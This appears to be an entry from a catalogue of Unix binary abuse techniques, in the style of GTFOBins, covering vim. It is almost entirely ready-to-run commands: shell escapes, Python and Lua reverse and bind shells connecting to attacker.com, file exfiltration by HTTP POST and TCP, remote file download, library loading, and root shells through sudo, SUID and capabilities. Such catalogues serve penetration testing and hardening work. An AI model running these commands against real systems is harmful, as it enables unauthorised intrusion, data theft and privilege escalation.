---
functions:
  shell:
    - code: vim -c ':!/bin/sh'
    - code: vim --cmd ':set shell=/bin/sh|:shell'
    - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
      code: vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
    - description: This requires that `vim` is compiled with Lua support.
      code: vim -c ':lua os.execute("reset; exec sh")'
  reverse-shell:
    - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
        s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
        pty.spawn("/bin/sh")
        vim.command(":q!")'
  non-interactive-reverse-shell:
    - description: Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        vim -c ':lua local s=require("socket"); local t=assert(s.tcp());
          t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
          while true do
            local r,x=t:receive();local f=assert(io.popen(r,"r"));
            local b=assert(f:read("*a"));t:send(b);
          end;
          f:close();t:close();'
  non-interactive-bind-shell:
    - description: Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.
      code: |
        export LPORT=12345
        vim -c ':lua local k=require("socket");
          local s=assert(k.bind("*",os.getenv("LPORT")));
          local c=s:accept();
          while true do
            local r,x=c:receive();local f=assert(io.popen(r,"r"));
            local b=assert(f:read("*a"));c:send(b);
          end;c:close();f:close();'
  file-upload:
    - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        export URL=http://attacker.com/
        export LFILE=file_to_send
        vim -c ':py import vim,sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
        else: import urllib as u, urllib2 as r
        r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
        vim.command(":q!")'
    - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.
      code: |
        export LPORT=8888
        vim -c ':py import vim,sys; from os import environ as e
        if sys.version_info.major == 3: import http.server as s, socketserver as ss
        else: import SimpleHTTPServer as s, SocketServer as ss
        ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
        vim.command(":q!")'
    - description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_send
        vim -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
          local d=f:read("*a")
          io.close(f);
          local s=require("socket");
          local t=assert(s.tcp());
          t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
          t:send(d);
          t:close();'
  file-download:
    - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        vim -c ':py import vim,sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r
        else: import urllib as r
        r.urlretrieve(e["URL"], e["LFILE"])
        vim.command(":q!")'
    - description: Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.
      code: |
        export LPORT=12345
        export LFILE=file_to_save
        vim -c ':lua local k=require("socket");
          local s=assert(k.bind("*",os.getenv("LPORT")));
          local c=s:accept();
          local d,x=c:receive("*a");
          c:close();
          local f=io.open(os.getenv("LFILE"), "wb");
          f:write(d);
          io.close(f);'
  file-write:
    - code: |
        vim file_to_write
        iDATA
        ^[
        w
  file-read:
    - code: vim file_to_read
  library-load:
    - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
      code: vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'
  suid:
    - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
      code: ./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
  sudo:
    - code: sudo vim -c ':!/bin/sh'
    - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
      code: sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
    - description: This requires that `vim` is compiled with Lua support.
      code: sudo vim -c ':lua os.execute("reset; exec sh")'
  capabilities:
    - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
      code: ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
  limited-suid:
    - description: This requires that `vim` is compiled with Lua support.
      code: ./vim -c ':lua os.execute("reset; exec sh")'
---
